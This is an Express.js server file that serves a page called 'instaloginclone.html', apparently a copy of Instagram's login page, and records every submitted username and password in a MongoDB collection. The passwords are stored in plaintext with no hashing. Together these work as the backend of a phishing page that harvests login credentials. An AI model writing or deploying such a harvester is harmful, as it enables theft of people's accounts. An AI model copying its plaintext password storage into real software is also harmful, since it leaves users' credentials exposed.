const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const dbConnection = require('./config/db');
const userModel = require('./models/user');

const app = express();



// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Route for home page
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "instaloginclone.html"));
});

// Route to handle form submission
app.post('/get-form-data', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: "Username and password are required!" });
        }

        const newUser = new userModel({ username, password });
        await newUser.save();

        res.status(201).json({ message: 'User saved successfully'});
    } catch (error) {
        console.error("Error saving user:", error);
        res.status(500).json({ message: "Internal Server Error" });
    }
});

// Start server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
});
